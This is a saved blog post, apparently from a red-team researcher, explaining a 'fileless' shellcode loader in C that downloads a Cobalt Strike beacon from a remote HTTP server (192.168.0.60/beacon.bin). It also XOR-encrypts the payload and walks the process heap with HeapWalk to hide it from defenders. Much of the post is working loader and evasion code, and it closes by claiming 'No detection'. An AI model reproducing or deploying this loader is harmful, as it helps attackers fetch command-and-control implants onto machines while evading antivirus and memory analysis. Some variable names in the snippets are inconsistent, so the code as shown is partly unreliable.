@@ -1,0 +1,162 @@
+# https://kleiton0x00.github.io/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/
+
+<!DOCTYPE html><html lang="en"><body data-spy="scroll" data-target="#toc"><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="https://kleiton0x00.github.io/"> Posts </a> </span> <span>Shellcodes are dead, long live Fileless Shellcodes</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip="">Shellcodes are dead, long live Fileless Shellcodes</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Feb 5, 2023, 12:00 AM +0100">Feb 4, 2023<i class="unloaded">2023-02-05T00:00:00+01:00</i></span> by <span class="author"> kleiton0x7e </span></div></div><div class="post-content"><p>Recently I was developing a simple Shellcode Loader which uses Callbacks as an alternative of Shellcode execution. While it bypasses every runtime scanning, it failed to bypass the signature detection. So I fired up <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> to identify the bad bytes:</p><p><img src="https://cdn-images-1.medium.com/max/800/1*KwJR9m_Ua3ujyGbK4GcSTw.png" data-src="https://cdn-images-1.medium.com/max/800/1*KwJR9m_Ua3ujyGbK4GcSTw.png" alt="bad_bytes_threatcheck" data-loaded="true"></p><p>At a first glance, it is impossible to understand what exactly is getting detected so I fired up <a href="https://ghidra-sre.org/">GHidra</a> to manually identify these bad bytes. I simply copied a random pattern from the ThreadCheck (<strong>00 1F CC 07 00 15 CC 07</strong>) and tried searching in the memeory of the compiled EXE of the malware.</p><p><img src="https://cdn-images-1.medium.com/max/800/1*UroW7mIted_uXKaqoQ20og.png" data-src="https://cdn-images-1.medium.com/max/800/1*UroW7mIted_uXKaqoQ20og.png" alt="ghidra_in_action" data-loaded="true"></p><p>This is clearly the XORed Shellcode I implemented to my Shellcode Loader and it’s getting detected as a Cobalt Strike agent by Defender. Seems like the XOR encryption routine is not strong enough againts static detection and that got me thinking: are stored shellcodes really dead (especially the ones generated from Cobalt Strike)? I wouldn’t be suprised, as currently Cobalt Strike is <a href="https://twitter.com/teamcymru_S2/status/1604091964386705409?s=20">the most popular C2 framework</a> among threat actors, but something must be done to make the Shellcode great and undetectable again.</p><h2 id="raw-shellcodes-whats-wrong-with-them">RAW Shellcodes: What’s wrong with them?</h2><p>Cobalt Strike’s payloads are based on Meterpreter shellcodes and include many similarities (sometimes identical) API hashing (<a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x86/src/block/block_api.asm">x86</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x64/src/block/block_api.asm">x64</a> versions).</p><p>The <a href="https://kleiton0x00.github.io/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/">default Hashes</a> that Cobalt Strike uses are highly signatured; we can get a workaround to such hashes by performing a <a href="https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection">dynamic Hash encoding</a>. If you look at the image below, the hash value <code class="language-plaintext highlighter-rouge">0xa779563a</code> is the default hash of <strong>InternetOpenA</strong>. If you simply google the hash, everything related to Metaploit will show up, so this hash is known to be mostly used by Cobalt Strike beacons and Meterpreter agents. Applying ror13 hashing to such hashes will drastically reduce the detection by AV vendors (to almost 0). As this is already nicely explain on <a href="https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection">this article</a>, I’m not going to explain it much further, but the photo below gives the idea of the final result after encoding the hashes.</p><p><img src="https://cdn-images-1.medium.com/max/800/1*B6Q4LXM_BP9fMW4ceu_3Lg.png" data-src="https://cdn-images-1.medium.com/max/800/1*B6Q4LXM_BP9fMW4ceu_3Lg.png" alt="cs_hashes" data-loaded="true"></p><h2 id="fileless-shellcode-to-the-rescue">Fileless Shellcode to the rescue</h2><p>Although it is not a new thing, fileless shellcodes are a good way of avoiding signature detection is by retrieving a shellcode from the internet. This way you will solve the problem of large entropy and any possible signature detection. On the photo below, there is a comparison between a traditional XORed encrypted shellcode and our fileless shellcode loader. Since the shellcode doesn’t have to be stored on .text section, the entropy will descrease drastically (remember that ):</p><p><img src="https://cdn-images-1.medium.com/max/800/1*5KjsCjd7bwYLlqjf-CGB2A.png" data-src="https://cdn-images-1.medium.com/max/800/1*5KjsCjd7bwYLlqjf-CGB2A.png" alt="entropy_comparison" data-loaded="true"></p><p>The full source code can be found <a href="https://github.com/kleiton0x00/RemoteShellcodeExec/">here</a>, but on this article I will try to break down the code for the sake of understanding.</p><p>In order to request the shellcode from the HTTP Server, I will be using <code class="language-plaintext highlighter-rouge">winhttp</code> library. Alternatively you can use sockets, based on some researches it might be a better solution which might results on lower runtime detection (as probably the Winsocket’s API will get hooked). The code below is responsible for sending an HTTP request to the remote server and waiting for the response:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>    <span class="c1">// Initialize WinHTTP </span>
+    <span class="n">hInternet</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Connect to the HTTP server </span>
+    <span class="n">hHttpSession</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span> <span class="s">L"192.168.0.60"</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">//192.168.0.60:8081</span>
+
+    <span class="c1">// Open an HTTP request </span>
+    <span class="n">hHttpRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hHttpSession</span><span class="p">,</span> <span class="s">L"GET"</span><span class="p">,</span> <span class="s">L"/beacon.bin"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Send a request </span>
+    <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hHttpRequest</span><span class="p">,</span> <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Wait for the response </span>
+    <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hHttpRequest</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div><p>WinHTTP receives the response in chunks, so we need to make a loop untill everything is retrieved:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre>    <span class="k">do</span>
+    <span class="p">{</span>
+        <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span><span class="n">hHttpRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Error %u in WinHttpQueryDataAvailable.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Allocate space for the buffer.</span>
+        <span class="n">pszOutBuffer</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">dwSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+
+        <span class="c1">// No more available data </span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pszOutBuffer</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[-] No more available data"</span><span class="p">);</span>
+            <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Read the Data.</span>
+        <span class="n">ZeroMemory</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpReadData</span><span class="p">(</span><span class="n">hHttpRequest</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pszOutBuffer</span><span class="p">,</span>
+            <span class="n">dwSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDownloaded</span><span class="p">))</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Error %u in WinHttpReadData.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">else</span>
+            <span class="n">PEbuf</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">PEbuf</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">pszOutBuffer</span> <span class="o">+</span> <span class="n">dwDownloaded</span><span class="p">);</span>
+
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div><p>Lastly, make sure to store each chunk in a vectored array:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>    <span class="kt">char</span><span class="o">*</span> <span class="n">PE</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">PEbuf</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">PEbuf</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PE</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">PEbuf</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div><h2 id="there-is-always-place-for-encryption">There is always place for encryption</h2><p>Notice the following part:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>    <span class="kt">char</span><span class="o">*</span> <span class="n">PE</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">PEbuf</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">PEbuf</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PE</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">PEbuf</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div><p>The shellcode retrieve from the teamserver is stored in the heap, making it easy for the blue-team to analyze the heap and discover what’s inside (clearly our unencrypted shellcode):</p><p><img src="https://cdn-images-1.medium.com/max/800/1*UVRHyvNkqqNV5H6kdcNSHA.png" data-src="https://cdn-images-1.medium.com/max/800/1*UVRHyvNkqqNV5H6kdcNSHA.png" alt="shellcode_written_in_memory" data-loaded="true"></p><p>Additionally, encrypting the shellcode in Heap is always a better idea:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>    <span class="kt">char</span><span class="o">*</span> <span class="n">PE</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">PEbuffer</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">PEbuf</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PE</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">PEbuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x7e</span><span class="p">;</span> <span class="c1">//XOR encrypted</span>
+    <span class="p">}</span>
+
+    <span class="n">XOR</span><span class="p">(</span><span class="n">PE</span><span class="p">,</span> <span class="n">PEbuffer</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="n">key</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div><p>Where <strong>XOR</strong> is a basic function which decrypts the array:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div><h2 id="protect-the-heap-at-all-cost">Protect the heap at all cost</h2><p>Encrypting the heap is a good idea because it protects sensitive data that could be stored in the heap. This is especially important when a program is running in an untrusted environment, as any data stored in the heap could be analyzed by a malware analyser.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="c1">// Encryption Key</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"A"</span><span class="p">;</span>
+<span class="kt">size_t</span> <span class="n">keySize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">xor_bidirectional_encode</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="k">const</span> <span class="kt">size_t</span> <span class="n">keyLength</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">const</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">keyLength</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">PROCESS_HEAP_ENTRY</span> <span class="n">entry</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">HeapEncryptDecrypt</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">SecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">entry</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">entry</span><span class="p">));</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">HeapWalk</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">entry</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">entry</span><span class="p">.</span><span class="n">wFlags</span> <span class="o">&amp;</span> <span class="n">PROCESS_HEAP_ENTRY_BUSY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">xor_bidirectional_encode</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">keySize</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">entry</span><span class="p">.</span><span class="n">lpData</span><span class="p">),</span> <span class="n">entry</span><span class="p">.</span><span class="n">cbData</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div><p>The <strong>HeapWalk()</strong> function is used to iterate through each heap entry in the process heap, and it is used to check whether the entry is busy. If it is busy, the xor_bidirectional_encode() function is used to encrypt and decrypt the entry. This is done by using the XOR operation to encrypt and decrypt the data.</p><h2 id="profit">Profit</h2><ol><li>Entropy is drastically reduced.</li><li>Heap is protected</li><li>No detection (Profit!)</li></ol><video src="https://i.imgur.com/U8LjkcA.mp4" controls="controls"></video></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shellcodes%20are%20dead,%20long%20live%20Fileless%20Shellcodes%20-%20kleiton0x7e&amp;url=protocol://domain/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shellcodes%20are%20dead,%20long%20live%20Fileless%20Shellcodes%20-%20kleiton0x7e&amp;u=protocol://domain/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Shellcodes%20are%20dead,%20long%20live%20Fileless%20Shellcodes%20-%20kleiton0x7e&amp;url=protocol://domain/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=protocol://domain/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://kleiton0x00.github.io/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip="">Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="https://kleiton0x00.github.io/posts/Navigating-Stealthy-WMI-Lateral-Movement/"><div class="card-body"> <span class="timeago small">Jun 25, 2023<i class="unloaded">2023-06-26T00:00:00+02:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Navigating Stealthy WMI Lateral Movement</h3><div class="text-muted small"><p> Mirrored from WKL Security Introduction In this article, we’ll look at a Python script that uses Windows Management Instrumentation (WMI) to remotely control a target computer. The script makes u...</p></div></div></a></div><div class="card"> <a href="https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/"><div class="card-body"> <span class="timeago small">May 22, 2023<i class="unloaded">2023-05-23T00:00:00+02:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Harnessing the Power of Cobalt Strike Profiles for EDR Evasion</h3><div class="text-muted small"><p> Mirrored from WKL Security. This version is an update ahead. Introduction In this blog post, we will go through the importance of each profile’s option, and explore the differences between defaul...</p></div></div></a></div><div class="card"> <a href="https://kleiton0x00.github.io/posts/Masking-the-Implant-with-Stack-Encryption/"><div class="card-body"> <span class="timeago small">May 1, 2023<i class="unloaded">2023-05-02T00:00:00+02:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Masking the Implant with Stack Encryption</h3><div class="text-muted small"><p> Mirrored from WKL Security Introduction This article is a demonstration of memory-based detection and evasion techniques. Whenever you build a Command &amp; Control or you perform threat hunting,...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/" class="btn btn-outline-primary"><p>The more predictable you are, the less you get detected - hiding malicious shellcodes via Shannon encoding</p></a> <a href="https://kleiton0x00.github.io/posts/Masking-the-Implant-with-Stack-Encryption/" class="btn btn-outline-primary"><p>Masking the Implant with Stack Encryption</p></a></div></div></div></div> </div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="https://kleiton0x00.github.io/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a>    
+</body></html>
